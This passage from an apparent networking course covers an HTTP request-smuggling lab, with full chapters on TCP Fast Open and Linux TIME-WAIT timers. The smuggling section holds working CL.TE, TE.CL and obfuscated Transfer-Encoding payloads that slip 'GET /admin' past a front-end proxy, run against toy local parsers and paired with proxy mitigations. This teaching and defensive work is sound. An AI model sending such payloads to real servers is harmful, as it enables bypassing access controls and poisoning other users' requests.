    show("back-end", back.seen)
    front.close(); back.close(); time.sleep(0.05)

    offline("3  Obfuscated TE: strict vs tolerant",
            b"POST / HTTP/1.1\r\nHost: v\r\nContent-Length: 4\r\n"
            b"Transfer-Encoding: cow\r\nTransfer-Encoding: chunked\r\n\r\n"
            b"0\r\n\r\nGET /admin HTTP/1.1\r\nHost: v\r\n\r\n",
            te_strict_frame, te_frame, "TE_STRICT", "TE tolerant")

    offline("4  Control: both CL, no TE",
            b"POST / HTTP/1.1\r\nHost: v\r\nContent-Length: 5\r\n\r\nhello",
            cl_frame, cl_frame, "CL parser A", "CL parser B")

if __name__ == "__main__":
    main()


Execution output
HTTP request-smuggling lab (toy front-end / back-end)

== 1  CL.TE live (front=CL, back=TE)
   front-end saw 1 request(s):

      GET /admin HTTP/1.1

title: HTTP Request Smuggling: CL.TE, TE.CL and Obfuscated Transfer-Encoding
text:
Reading the output

1 CL.TE live
The front-end framed one request (POST /). The back-end framed two: the same POST /, then GET /admin. The desync line lists request lines the back-end saw that the front-end never emitted as its own request line — exactly the smuggled /admin.


1b CL.TE offline
Applying the two pure framing functions to the same byte string reproduces the live result without TCP: CL parser → 1 request; TE parser → 2 requests. This is the byte-level proof that the desync is in the parsers, not in a proxy bug elsewhere.


2 TE.CL offline
The TE parser emits two request lines (POST /, GET /secret). The CL parser, hungry for Content-Length bytes that include part of the smuggled request, produces a malformed leftover (v). That garbage second “request” is what a desynced CL back-end can turn into parser state corruption or a poisoned prefix on the next victim request.


2b TE.CL live
The front-end forwarded the TE-framed POST / and blocked waiting for an upstream response while the CL back-end was still reading a body that never came as a single request. Live count: front-end 1, back-end 0. In production this shows up as a stuck upstream connection and odd timeouts, not always as a clean smuggled method line.


3 Obfuscated TE
TE_STRICT rejected [cow, chunked] with 400. The tolerant TE parser accepted the same bytes and saw the smuggled GET /admin. Any front-end that is strict while the back-end is tolerant (or the reverse) is a TE.TE desync waiting to happen.


4 Control
Both parsers use CL and see a single POST / with a five-byte body. No desync.

title: HTTP Request Smuggling: CL.TE, TE.CL and Obfuscated Transfer-Encoding
text:
In production
(not run here) — directives from current docs:
nginx (reject ambiguous framing; prefer HTTP/2 to upstream when possible):
# Ensure the proxy does not forward ambiguous TE; prefer a single framing.
proxy_http_version 1.1;
# HTTP/2 to upstream where supported eliminates H1 desync on that hop.
# proxy_http_version 2;  # when the upstream module supports it
HAProxy (2.x+ has explicit http-request reject rules for dual CL+TE in many configs):
http-request deny if { req.hdr_cnt(content-length) gt 0 } { req.hdr_cnt(transfer-encoding) gt 0 }
AWS ALB / Google CLB / Cloudflare: check the current “HTTP desync” / “request smuggling” product docs for whether the edge normalises or rejects dual CL+TE; do not assume.
Always:

Prefer HTTP/2 or HTTP/3 between proxy and origin when both support it.
Log the front-end request id on the back-end and alert when back-end paths have no matching front-end id.
Treat keep-alive H1 upstream pools as the blast radius; drain them after a suspected desync.

title: HTTP Request Smuggling: CL.TE, TE.CL and Obfuscated Transfer-Encoding
text:
Gotchas

H2 to the browser is not enough. If the proxy downgrades to HTTP/1.1 toward the origin, smuggling still lives on that hop.
“Transfer-Encoding: chunked” with Content-Length. RFC 9112 forbids generating both; many stacks still accept both and pick a winner silently.
Obfuscation is parser-specific. Space, tab, folding, duplicate headers, and chunked as a list element have all been used. Test your pair, not a generic checklist.
CL.TE can bypass front-end ACLs. /admin never appeared as a front-end request line in the lab; a WAF that only sees the front-end view will miss it.
TE.CL often looks like a hang. Operators chase timeouts instead of desync.
HTTP/2 CONTINUATION / HPACK bombs are a different class. Covered in the HPACK/QPACK chapter; do not confuse them with H1 CL.TE.
Absolute-form and rewrite rules. Some front-ends rewrite the request line before forwarding; smuggled requests may carry a different host than the envelope.

title: HTTP Request Smuggling: CL.TE, TE.CL and Obfuscated Transfer-Encoding
text:
Exercises

Change the CL.TE payload so the smuggled request is DELETE /user/1 and confirm the back-end request line.
Modify te_strict_frame to also reject TE values with leading/trailing spaces around chunked. Re-run scenario 3.
Add a third framing mode that follows RFC 9112 literally: if both CL and TE are present, return 400 without forwarding. Show that both CL.TE and TE.CL payloads die at the front-end.
Capture the CL.TE live exchange with a pure-Python hex dump of what the front-end sent upstream; mark where the smuggled request begins.
On a lab host with nginx, enable HTTP/1.1 upstream and attempt a dual CL+TE request; then switch the upstream module to HTTP/2 and compare. Mark what you cannot reproduce without installs.
Explain why a single-request (non-keep-alive) upstream connection shrinks but does not eliminate CL.TE impact.

title: TCP Fast Open
text:
TCP Fast Open
A new TCP connection costs one round trip before the client may send a byte: SYN, SYN-ACK, then data. For a 2 ms LAN that is noise. For a 150 ms mobile path and a 1 KB request, it is half the latency of the whole exchange. TCP Fast Open (TFO, RFC 7413) lets a client that has talked to a server before put data in the SYN itself, and lets the server hand that data to the application before the handshake completes. The price is a cookie the server must manage, an application that must accept the same request twice, and networks that sometimes drop SYNs that carry data. This chapter shows every one of those moving parts on Linux, in a rootless namespace lab with real counters and a packet decoder, and ends with when to turn it on.

title: TCP Fast Open
text:
Learning goals

Explain the TFO cookie exchange and which connection actually saves the round trip
Read and set net.ipv4.tcp_fastopen, and know which side each bit enables
Use MSG_FASTOPEN (or TCP_FASTOPEN_CONNECT) on a client and TCP_FASTOPEN on a listener
Prove TFO happened with TCP_INFO, TcpExt counters, ip tcp_metrics and the SYN on the wire
Rotate the server key without failing every cached cookie
Say why TFO data must be idempotent and why middleboxes still matter

Version note. The labs ran on 2026-11-13 on Linux 6.12.94+, iproute2 6.15.0 and Python 3.13.5, as an unprivileged user inside unshare -rn (a new user and network namespace with only lo). The tcp_fastopen* sysctls are per network namespace, so they can be changed there without root on the host. tcpdump is not installed on the writing host, so a 50-line AF_PACKET decoder shows the SYNs instead. Every listing below is pasted from those runs.

title: TCP Fast Open
text:
How the cookie exchange works
TFO adds one TCP option, kind 34 (RFC 7413 4.1.1). The first connection to a server is a normal handshake that also asks for a cookie; later connections present it:
  connection 1 (no cookie cached)                 connection 2+ (cookie cached)

  C ── SYN, TFO(empty) ───────────► S             C ── SYN, TFO(cookie), DATA ──► S
  C ◄── SYN-ACK, TFO(cookie) ─────── S              S validates cookie, hands DATA
  C ── ACK ───────────────────────► S                to the app *now*
  C ── DATA ──────────────────────► S             C ◄── SYN-ACK (acks DATA) ───── S
                                                  C ◄── response (can be in the
  1 RTT before the server sees data                     same flight as SYN-ACK)
                                                  C ── ACK ──────────────────────► S

                                                  0 RTT before the server sees data
The cookie is a MAC the server computes over the client’s IP address with a secret key (Linux uses SipHash, keyed by tcp_fastopen_key). It proves the client recently received a packet at that address, which is what stops an attacker from spoofing source addresses to make a server do work for SYNs with data. The client caches the cookie per server address. Only connection 2 and later save the round trip.
Three rules follow from the design and explain most production surprises:

The server may get the SYN data twice. A retransmitted or duplicated SYN carries the same data, and RFC 7413 section 6 is explicit that the server application must tolerate it. Only idempotent requests belong in the SYN.
Falling back is always allowed. If the cookie is wrong, missing, or the server does not support TFO, the server ignores the data and completes a normal handshake; the client retransmits the data after the handshake. Correctness does not depend on TFO; latency does.
The cookie is tied to the client address. NAT rebinding, a new Wi-Fi network, or a load balancer that hashes to a different server with a different key means “no valid cookie” again.

title: TCP Fast Open
text:
The Linux knobs








Setting
Scope
Meaning




net.ipv4.tcp_fastopen bit 0x1
netns
Client may send data in SYN (via MSG_FASTOPEN / TCP_FASTOPEN_CONNECT). Default value is 1.


bit 0x2
netns
Server side enabled for listeners that set TCP_FASTOPEN


bit 0x4
netns
Client sends data in SYN even without a cookie (testing only)


bit 0x200
netns
Server accepts SYN data without a cookie (testing; removes the spoofing defence)


bit 0x400
netns
Server TFO on every listener, without the socket option


net.ipv4.tcp_fastopen_key
netns
Primary key, optionally ,backup key. Format: four 8-digit hex groups


net.ipv4.tcp_fastopen_blackhole_timeout_sec
netns
After a detected TFO blackhole, disable active TFO for this long (doubling on repeats). 0 disables the mechanism


setsockopt(TCP_FASTOPEN, qlen)
listener
Turn on server TFO for this socket; qlen caps pending TFO requests not yet through the handshake


sendto(..., MSG_FASTOPEN, addr)
client
connect() + send() in one call


setsockopt(TCP_FASTOPEN_CONNECT, 1)
client
Keep the usual connect(); the first write() goes in the SYN (Linux 4.11+)



The value is a bitmask, so 3 means client and server. Server TFO is opt-in twice: the sysctl bit and the listener’s socket option. Phase D below shows what happens when only the first one is set.

title: TCP Fast Open
section: Lab: one client, one server, five phases
text:
Lab: one client, one server, five phases
The test program runs a TFO-enabled listener on 127.0.0.1:8443 in a thread, makes N client connections with MSG_FASTOPEN, and prints for each one whether the SYN-ACK acknowledged the data the client put in the SYN (TCPI_OPT_SYN_DATA, bit 0x20 of tcpi_options in struct tcp_info). It finishes with the change in every TcpExt: TCPFastOpen* counter from /proc/net/netstat.
# tfo.py: TCP Fast Open cookie request, then data-in-SYN, inside one netns on lo.
# Usage: tfo.py [server_qlen]   (run inside unshare -rn after writing tcp_fastopen)
import socket, sys, time, threading

def tfo_counters():
    lines = open("/proc/net/netstat").read().splitlines()
    hdr, val = [l.split() for l in lines if l.startswith("TcpExt:")]
    return {k: int(v) for k, v in zip(hdr[1:], val[1:]) if k.startswith("TCPFastOpen")}

PORT = 8443
qlen = int(sys.argv[1]) if len(sys.argv) > 1 else 16
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
if qlen:
    srv.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, qlen)
srv.bind(("127.0.0.1", PORT)); srv.listen(16)

def serve():
    while True:
        c, _ = srv.accept()
        data = c.recv(100)
        c.sendall(b"pong:" + data); c.close()
threading.Thread(target=serve, daemon=True).start()

before = tfo_counters()
N = int(sys.argv[2]) if len(sys.argv) > 2 else 3
for i in range(1, N + 1):
    cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # MSG_FASTOPEN = connect + send in one call; data rides in the SYN if a cookie is cached
    cli.sendto(b"ping%d" % i, socket.MSG_FASTOPEN, ("127.0.0.1", PORT))
    reply = cli.recv(100)
    info = cli.getsockopt(socket.IPPROTO_TCP, socket.TCP_INFO, 256)
    opts = info[5]                       # tcpi_options (byte 5 of struct tcp_info)
    # TCPI_OPT_SYN_DATA (0x20): the SYN-ACK acknowledged data carried in our SYN
    print(f"conn {i}: reply={reply!r:16} tcpi_options=0x{opts:02x} "
          f"syn_data_acked={'yes' if opts & 0x20 else 'no'}")
    cli.close()
    time.sleep(0.1)
after = tfo_counters()
print("TcpExt deltas:", {k: after[k] - before[k] for k in after if after[k] != before[k]})
#!/bin/sh
# Run as: unshare -rn ./lab.sh   (unprivileged user + net namespace; no sudo)
cd "$(dirname "$0")"; ip link set lo up
echo "== A. netns defaults"
for f in tcp_fastopen tcp_fastopen_blackhole_timeout_sec; do
  echo "$f=$(cat /proc/sys/net/ipv4/$f)"; done
echo "== B. tcp_fastopen=1 (client only): the cookie request is never answered"
python3 tfo.py 16 2
echo "== C. tcp_fastopen=3, listener with TCP_FASTOPEN qlen 16"
echo 3 > /proc/sys/net/ipv4/tcp_fastopen
python3 tfo.py 16 3
echo "-- client cookie cache (ip tcp_metrics)"
ip tcp_metrics show 127.0.0.1 | sed 's/fo_cookie [0-9a-f]*/fo_cookie <8 bytes>/'
echo "== D. same sysctl, but the listener never sets TCP_FASTOPEN"
python3 tfo.py 0 2
echo "== E. server key rotated: cached cookie no longer validates"
python3 tfo.py 16 1 >/dev/null     # make sure a valid cookie is cached
echo 00000000-00000000-00000000-0000abcd > /proc/sys/net/ipv4/tcp_fastopen_key
python3 tfo.py 16 2
echo "== F. rotate properly: new primary key, old key kept as backup"
python3 tfo.py 16 1 >/dev/null     # cookie under the current key ...abcd
echo "00000000-00000000-00000000-0000beef,00000000-00000000-00000000-0000abcd" > /proc/sys/net/ipv4/tcp_fastopen_key
cat /proc/sys/net/ipv4/tcp_fastopen_key
python3 tfo.py 16 2

A–B. Defaults: the client asks, nobody answers
$ unshare -rn ./lab.sh
== A. netns defaults
tcp_fastopen=1
tcp_fastopen_blackhole_timeout_sec=0
== B. tcp_fastopen=1 (client only): the cookie request is never answered
conn 1: reply=b'pong:ping1'    tcpi_options=0x07 syn_data_acked=no
conn 2: reply=b'pong:ping2'    tcpi_options=0x07 syn_data_acked=no
TcpExt deltas: {'TCPFastOpenCookieReqd': 2}
A fresh namespace has tcp_fastopen=1: client side only. The client asks for a cookie on every connection (TCPFastOpenCookieReqd: 2), the server side is off, so no cookie comes back and every connection is a normal handshake. Nothing breaks, nothing is faster. This is the state of most Linux hosts.


C. Both sides on
== C. tcp_fastopen=3, listener with TCP_FASTOPEN qlen 16
conn 1: reply=b'pong:ping1'    tcpi_options=0x07 syn_data_acked=no
conn 2: reply=b'pong:ping2'    tcpi_options=0x27 syn_data_acked=yes
conn 3: reply=b'pong:ping3'    tcpi_options=0x27 syn_data_acked=yes
TcpExt deltas: {'TCPFastOpenActive': 2, 'TCPFastOpenPassive': 2, 'TCPFastOpenCookieReqd': 1}
-- client cookie cache (ip tcp_metrics)
127.0.0.1 age 0.104sec cwnd 10 rtt 44us rttvar 46us fo_mss 65495 fo_cookie <8 bytes> source 127.0.0.1
Connection 1 requests a cookie (CookieReqd: 1) and pays the round trip. Connections 2 and 3 send their data in the SYN, the server accepts it (TCPFastOpenPassive: 2), and tcpi_options gains bit 0x20. The low bits 0x07 are timestamps, SACK and window scaling. The client’s cookie cache is the TCP metrics table, keyed by destination; the script masks the cookie value. fo_mss is cached with it so the client knows how much data fits in the next SYN.


What the SYNs look like
Run the decoder alongside two connections:
# syns.py SECONDS: print every TCP SYN / SYN-ACK on lo with its options and payload size.
import socket, struct, sys, time
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
s.bind(("lo", 0)); s.settimeout(0.2)
end = time.time() + float(sys.argv[1])
NAMES = {2: "MSS", 3: "WS", 4: "SACKOK", 8: "TS", 34: "TFO"}
while time.time() < end:
    try:
        pkt, addr = s.recvfrom(65535)
    except socket.timeout:
        continue
    if addr[2] == socket.PACKET_OUTGOING:          # lo shows each frame twice
        continue
    ip = pkt[14:]
    if ip[0] >> 4 != 4 or ip[9] != 6:
        continue
    ihl = (ip[0] & 0xF) * 4; tot = struct.unpack("!H", ip[2:4])[0]
    tcp = ip[ihl:tot]
    sport, dport, seq, ack, off_flags = struct.unpack("!HHIIH", tcp[:14])
    doff = (off_flags >> 12) * 4; flags = off_flags & 0x3F
    if not flags & 0x02:
        continue
    opts, i, o = [], 20, tcp[20:doff]
    i = 0
    while i < len(o):
        k = o[i]
        if k == 0: break
        if k == 1: i += 1; continue
        ln = o[i + 1]
        name = NAMES.get(k, str(k))
        opts.append(f"{name}({ln - 2}B)" if k == 34 else name)
        i += ln
    kind = "SYN-ACK" if flags & 0x10 else "SYN    "
    print(f"{kind} {sport:>5} -> {dport:<5} payload={len(tcp) - doff:>2}B  opts={','.join(opts)}")
#!/bin/sh
# Run as: unshare -rn ./cap.sh
cd "$(dirname "$0")"; ip link set lo up
echo 3 > /proc/sys/net/ipv4/tcp_fastopen
python3 syns.py 2 & sleep 0.5
python3 tfo.py 16 2
wait
$ unshare -rn ./cap.sh
conn 1: reply=b'pong:ping1'    tcpi_options=0x07 syn_data_acked=no
conn 2: reply=b'pong:ping2'    tcpi_options=0x27 syn_data_acked=yes
TcpExt deltas: {'TCPFastOpenActive': 1, 'TCPFastOpenPassive': 1, 'TCPFastOpenCookieReqd': 1}
SYN     35170 -> 8443  payload= 0B  opts=MSS,SACKOK,TS,WS,TFO(0B)
SYN-ACK  8443 -> 35170 payload= 0B  opts=MSS,SACKOK,TS,WS,TFO(8B)
SYN     35176 -> 8443  payload= 5B  opts=MSS,SACKOK,TS,WS,TFO(8B)
SYN-ACK  8443 -> 35176 payload= 0B  opts=MSS,SACKOK,TS,WS
The first SYN carries an empty TFO option: the cookie request. The SYN-ACK answers with an 8-byte cookie. The second SYN carries the cookie and 5 bytes of payload (ping2), which a normal SYN never does. Its SYN-ACK has no TFO option at all; acknowledging the data is the confirmation. If you capture with tcpdump on a real host, look for tfo cookiereq, tfo cookie <hex> and a non-zero length on a [S] packet.


D. The sysctl is on, the listener is not
== D. same sysctl, but the listener never sets TCP_FASTOPEN
conn 1: reply=b'pong:ping1'    tcpi_options=0x07 syn_data_acked=no
conn 2: reply=b'pong:ping2'    tcpi_options=0x07 syn_data_acked=no
TcpExt deltas: {'TCPFastOpenActiveFail': 2}
The client still had a cookie from phase C, so it sent SYN+data. This server process never called setsockopt(TCP_FASTOPEN), so the kernel ignored the data and completed a normal handshake. The client noticed the data was not acknowledged (TCPFastOpenActiveFail: 2) and sent it again after the handshake. The replies are identical; only latency changed. Turning on tcp_fastopen=3 fleet-wide does nothing for an application that does not opt in, unless you also set 0x400.


E. Key rotation that breaks every cookie
== E. server key rotated: cached cookie no longer validates
conn 1: reply=b'pong:ping1'    tcpi_options=0x07 syn_data_acked=no
conn 2: reply=b'pong:ping2'    tcpi_options=0x27 syn_data_acked=yes
TcpExt deltas: {'TCPFastOpenActive': 1, 'TCPFastOpenActiveFail': 1, 'TCPFastOpenPassive': 1, 'TCPFastOpenPassiveFail': 1}
Writing a single new key replaces the old one. The client’s cached cookie no longer validates: the server counts TCPFastOpenPassiveFail, the client counts TCPFastOpenActiveFail, the request is delivered after a full handshake, and the SYN-ACK carries a new cookie. Connection 2 is fast again. On one host that is one slow connection. Across a fleet behind a load balancer, rotating keys independently on each backend, or giving each backend its own random key, means a client almost never presents a cookie the backend it lands on can validate.


F. Key rotation that does not
== F. rotate properly: new primary key, old key kept as backup
00000000-00000000-00000000-0000beef,00000000-00000000-00000000-0000abcd
conn 1: reply=b'pong:ping1'    tcpi_options=0x27 syn_data_acked=yes
conn 2: reply=b'pong:ping2'    tcpi_options=0x27 syn_data_acked=yes
TcpExt deltas: {'TCPFastOpenActive': 2, 'TCPFastOpenPassive': 2, 'TCPFastOpenPassiveAltKey': 1}
The key file takes primary,backup. Cookies are issued with the primary key and accepted under either. The old cookie validated against the backup (TCPFastOpenPassiveAltKey: 1), so even the first connection after rotation saved its round trip. Rotate in two steps: push new,old everywhere, wait longer than your clients’ cookie lifetime, then push new alone. Every server behind one VIP must share the same keys.

title: TCP Fast Open
text:
Counters to watch in production







TcpExt counter (nstat -az 'TcpExtTCPFastOpen*')
Rises when




TCPFastOpenActive
This host sent SYN data and it was acknowledged


TCPFastOpenActiveFail
This host sent SYN data and it was not acknowledged (server ignored it, middlebox stripped it)


TCPFastOpenPassive
A listener here accepted SYN data


TCPFastOpenPassiveFail
A client presented a cookie that did not validate


TCPFastOpenPassiveAltKey
A cookie validated against the backup key


TCPFastOpenListenOverflow
More pending TFO requests than the listener’s qlen


TCPFastOpenCookieReqd
A client asked for a cookie


TCPFastOpenBlackhole
Active TFO disabled after a suspected blackhole



A healthy TFO server has Passive much larger than PassiveFail. A client fleet whose ActiveFail tracks Active is talking to servers or paths that do not honour TFO, and is paying a retransmission for it.

title: TCP Fast Open
section: Where TFO is worth it, and where it is not
text:
Where TFO is worth it, and where it is not







Good fit
Poor fit




Short request/response over high RTT (RPC to a remote region, DNS over TCP/DoT to a fixed resolver)
Long-lived connections: one saved RTT per hour is nothing


Clients and servers you both control, one network path
The open internet through unknown firewalls and NATs


Requests that are naturally idempotent (GET, lookups)
Anything with side effects in the first bytes (non-idempotent RPC, POST)


Servers behind one VIP with shared keys
Backends with independent keys behind consistent-hash LBs



On the public web, TLS already needs its own round trip, and TLS 1.3 0-RTT and QUIC 0-RTT give the same “data in the first flight” benefit with replay rules designed at the application layer (see TLS 1.3 0-RTT and replay). Middlebox interference is also why browsers ship with TFO off. TFO remains a sound tool inside a data centre, between your own services, and for DNS-over-TCP to resolvers you run.

title: TCP Fast Open
text:
Gotchas

Two switches on the server. tcp_fastopen bit 0x2 and setsockopt(TCP_FASTOPEN) (or bit 0x400). Missing either looks like phase D.
The first connection is never faster. Benchmarks that open one connection per process measure only cookie requests.
SYN data can arrive twice. Make the first request idempotent, or do not send it in the SYN.
Single-key rotation fails every cached cookie. Use new,old, then new.
Per-backend keys defeat TFO behind a load balancer. Share keys across the pool.
Cookies follow the client IP. Clients behind changing NAT or roaming between networks fall back often.
0x200 (no cookie required) is a test switch. It turns TFO into an amplification aid for spoofed SYNs.
A blackhole timer of 0 means no automatic back-off. If you run active TFO across networks you do not control, consider a non-zero tcp_fastopen_blackhole_timeout_sec.

title: TCP Fast Open
text:
Boring rule
Leave the client bit on. Turn on the server side only for listeners whose first request is idempotent, behind a shared key that you rotate with a backup, and only after TcpExtTCPFastOpenPassive versus PassiveFail tells you clients are actually using it.

title: TCP Fast Open
text:
Try this

Repeat phase C with tcp_fastopen=0x5 on the client side only and the server at 1. What does the server do with data in a SYN that carries no cookie?
Set the listener qlen to 1 and open ten TFO connections concurrently with threads. Which counter moves?
Replace MSG_FASTOPEN in tfo.py with TCP_FASTOPEN_CONNECT (setsockopt(IPPROTO_TCP, 30, 1), then connect() and send()). Confirm the SYN still carries the payload with syns.py.
Send 2000 bytes in the SYN instead of 5. How much ends up in the SYN on lo, and what does fo_mss have to do with it?
Design a key rotation runbook for ten backends behind one VIP: order of pushes, wait time, and the counters you check at each step.

title: TIME-WAIT on Linux: What the Timers Really Do
text:
Learning goals

Say which end of a connection holds TIME-WAIT, and why
Read the timer:(timewait,…) field in ss -o and tell TIME-WAIT from an orphaned FIN-WAIT-2
Explain why net.ipv4.tcp_fin_timeout does not shorten TIME-WAIT on Linux
Recognise source-port exhaustion (EADDRNOTAVAIL) and fix it in the right order: pooling first, then tcp_tw_reuse, never tcp_max_tw_buckets

title: TIME-WAIT on Linux: What the Timers Really Do
text:
Thesis
TIME-WAIT is the price the active closer pays so that old segments of a connection die before the same four-tuple is used again. RFC 9293 asks for 2×MSL. Linux pays a fixed 60 seconds: TCP_TIMEWAIT_LEN (60*HZ) in include/net/tcp.h. No sysctl changes it. The sysctl most people reach for, tcp_fin_timeout, times a different state. If short connections run you out of ports, the fix is fewer connections (pooling, keep-alive), not a shorter wait.

title: TIME-WAIT on Linux: What the Timers Really Do
text:
Mental model



A TCP close: the side that sends the first FIN ends in TIME-WAIT for a hard-coded 60 seconds. tcp_fin_timeout only limits FIN-WAIT-2 for sockets the application has already closed.


Three facts carry the whole chapter:

Whoever sends the first FIN waits. It is a role, not “the client” or “the server”. An HTTP server that closes idle keep-alive connections collects TIME-WAIT itself.
TIME-WAIT costs a four-tuple, not much memory. Linux swaps the full socket for a small tcp_timewait_sock. The scarce thing is the local port toward one destination (dst IP, dst port).
Two timers, two states. TIME-WAIT is always 60 s. An orphaned FIN-WAIT-2 (the app called close(), the peer never sent its FIN) is limited by tcp_fin_timeout.

title: TIME-WAIT on Linux: What the Timers Really Do
text:
Why the wait exists (RFC 9293, §3.6)

Late duplicates. A segment delayed in the network must not be accepted by a new connection that reuses the same four-tuple and happens to have an overlapping sequence space.
The last ACK can be lost. If the final ACK is lost, the peer resends its FIN. The side in TIME-WAIT still has state and re-ACKs it. Without that state it would answer with RST, and the peer would log an error for a connection that actually closed cleanly.

RFC 9293 sets the wait at 2×MSL, with MSL “arbitrarily defined to be 2 minutes” (4 minutes in total). Linux chose 60 s long ago and wrote it as a compile-time constant.

title: TIME-WAIT on Linux: What the Timers Really Do
TIME-WAIT on Linux: What the Timers Really Do
section: The knobs, and what each one really does
text:
The knobs, and what each one really does








Sysctl (per network namespace)
Default
Effect on TIME-WAIT




net.ipv4.tcp_fin_timeout
60
None. Limits orphaned FIN-WAIT-2 only


net.ipv4.tcp_max_tw_buckets
depends on memory (65536 in the lab below)
A cap. Over it, a closing socket skips TIME-WAIT and is destroyed at once (TcpExtTCPTimeWaitOverflow). The docs: “you must not lower the limit artificially”


net.ipv4.tcp_tw_reuse
2
A new outgoing connect() may take over a TIME-WAIT four-tuple if both ends used TCP timestamps and the newest timestamp is from an earlier second. 0 = off, 1 = all, 2 = loopback only


net.ipv4.tcp_tw_recycle
removed
Removed in Linux 4.12. It broke clients behind NAT. Old tuning guides that set it now just fail


net.ipv4.ip_local_port_range
32768 60999
How many source ports a client has per destination

title: TIME-WAIT on Linux: What the Timers Really Do
section: Lab 1: watch the timers (run, no sudo)
text:
Lab 1: watch the timers (run, no sudo)
Everything below runs inside unshare -rn: a private network namespace in which you are root, so its TCP sysctls are yours to change and the host is not affected. You need Python 3 and ss/nstat from iproute2. These are genuine outputs from Linux 6.12.
tw.py opens N connections on loopback and always closes the client side first:
"""Make TCP connections on loopback and close them from the client side.

usage: python3 tw.py PORT N {both-close|server-holds} SECONDS
  both-close    the client closes first, the server closes on EOF  -> client in TIME-WAIT
  server-holds  the client closes, the server never does           -> client in FIN-WAIT-2
The server sockets stay alive for SECONDS so ss can look at them.
"""
import socket, sys, time

port, n, mode, hold = int(sys.argv[1]), int(sys.argv[2]), sys.argv[3], float(sys.argv[4])
srv = socket.socket(); srv.bind(("127.0.0.1", port)); srv.listen(64)
kept = []
for _ in range(n):
    c = socket.create_connection(("127.0.0.1", port))
    s, _ = srv.accept()
    c.close()                      # the client sends FIN first: the active closer
    if mode == "both-close":
        s.recv(1)                  # read the EOF
        s.close()                  # the server's FIN completes the close
    else:
        kept.append(s)             # never close: the client waits in FIN-WAIT-2
time.sleep(hold)
lab.sh drives it and reads the timers back with ss -o:
#!/bin/sh
# Run as: unshare -rn sh lab.sh   (a private network namespace; its TCP sysctls are its own)
ip link set lo up
P=/proc/sys/net/ipv4
show() { ss -tano state "$1" "( dport = :$2 )" | sed 1d | sed "s/^/$1  /"; }

echo "== 1. defaults in a fresh namespace"
for k in tcp_fin_timeout tcp_max_tw_buckets tcp_tw_reuse; do echo "$k = $(cat $P/$k)"; done

echo "== 2. client closes first: who holds TIME-WAIT, for how long?"
python3 tw.py 8001 3 both-close 0; show time-wait 8001
ss -tanH "( sport = :8001 )" | wc -l | sed 's/^/server-side sockets left: /'

echo "== 3. tcp_fin_timeout=5 does not shorten TIME-WAIT"
echo 5 > $P/tcp_fin_timeout
python3 tw.py 8002 2 both-close 0; show time-wait 8002

echo "== 4. ...it times FIN-WAIT-2 for sockets the app already closed"
python3 tw.py 8003 2 server-holds 7 & sleep 0.5; show fin-wait-2 8003
sleep 5; echo "after 5.5 s:"; ss -tanH "( dport = :8003 )" | wc -l | sed 's/^/client sockets left: /'; wait

echo "== 5. tcp_max_tw_buckets=2: the third socket skips TIME-WAIT"
echo 60 > $P/tcp_fin_timeout
sleep 75                                    # let every earlier TIME-WAIT socket be reaped
echo "TIME-WAIT sockets before: $(ss -tanH state time-wait | wc -l)"
echo 2 > $P/tcp_max_tw_buckets
before=$(nstat -az TcpExtTCPTimeWaitOverflow | awk '/Overflow/{print $2}')
python3 tw.py 8005 5 both-close 0; show time-wait 8005
after=$(nstat -az TcpExtTCPTimeWaitOverflow | awk '/Overflow/{print $2}')
echo "TcpExtTCPTimeWaitOverflow: $before -> $after"
$ unshare -rn sh lab.sh
== 1. defaults in a fresh namespace
tcp_fin_timeout = 60
tcp_max_tw_buckets = 65536
tcp_tw_reuse = 2
== 2. client closes first: who holds TIME-WAIT, for how long?
time-wait  0      0          127.0.0.1:37370    127.0.0.1:8001 timer:(timewait,59sec,0)
time-wait  0      0          127.0.0.1:37366    127.0.0.1:8001 timer:(timewait,59sec,0)
time-wait  0      0          127.0.0.1:37386    127.0.0.1:8001 timer:(timewait,59sec,0)
server-side sockets left: 0
== 3. tcp_fin_timeout=5 does not shorten TIME-WAIT
time-wait  0      0          127.0.0.1:47914    127.0.0.1:8002 timer:(timewait,59sec,0)
time-wait  0      0          127.0.0.1:47930    127.0.0.1:8002 timer:(timewait,59sec,0)
== 4. ...it times FIN-WAIT-2 for sockets the app already closed
fin-wait-2  0      0          127.0.0.1:38132    127.0.0.1:8003 timer:(timewait,4.516sec,0)
fin-wait-2  0      0          127.0.0.1:38116    127.0.0.1:8003 timer:(timewait,4.516sec,0)
after 5.5 s:
client sockets left: 0
== 5. tcp_max_tw_buckets=2: the third socket skips TIME-WAIT
TIME-WAIT sockets before: 0
time-wait  0      0          127.0.0.1:56858    127.0.0.1:8005 timer:(timewait,59sec,0)
time-wait  0      0          127.0.0.1:56848    127.0.0.1:8005 timer:(timewait,59sec,0)
TcpExtTCPTimeWaitOverflow: 0 -> 3
Reading it:

Step 2. Only the client’s sockets (destination port 8001) are in TIME-WAIT, each with timewait,59sec. The server, the passive closer, kept nothing.
Step 3. With tcp_fin_timeout at 5, new TIME-WAIT sockets still start at 59 s. The constant wins.
Step 4. The server never closes, so the client (already closed by the app) sits in FIN-WAIT-2. This timer is ~4.5 s, the 5 s tcp_fin_timeout, and 5.5 s later the client side is gone. The kernel stores it as a time-wait mini-socket, which is why ss prints timewait as the timer name for a fin-wait-2 row.
Step 5. With the cap at 2, two sockets enter TIME-WAIT and three are destroyed on the spot, counted by TcpExtTCPTimeWaitOverflow. That is the lost-ACK protection gone for those three. The only trace is that counter (6.12 prints no log line), so this setting is a DoS brake, not a tuning knob.

A detail you will hit in your own experiments: a TIME-WAIT socket can linger a few seconds past 60 s, shown as timer:(timewait,,0). That’s because long kernel timers are batched on a coarse timer wheel. Wait about 70 s between runs, or use a new port each time as the scripts above do.

title: TIME-WAIT on Linux: What the Timers Really Do
section: Lab 2: port exhaustion and the fixes (run, no sudo)
text:
Lab 2: port exhaustion and the fixes (run, no sudo)
Each TIME-WAIT socket holds one local port toward one (dst IP, dst port). A client that opens a new connection per request to the same backend uses up ip_local_port_range within the 60 s. exhaust.py makes it quick by shrinking the range to four ports:
"""Open-and-close short connections until connect() runs out of source ports.

usage: python3 exhaust.py ATTEMPTS [PAUSE]
Each round: connect, server closes on EOF after the client closes (client keeps TIME-WAIT).
"""
import errno, socket, sys, time

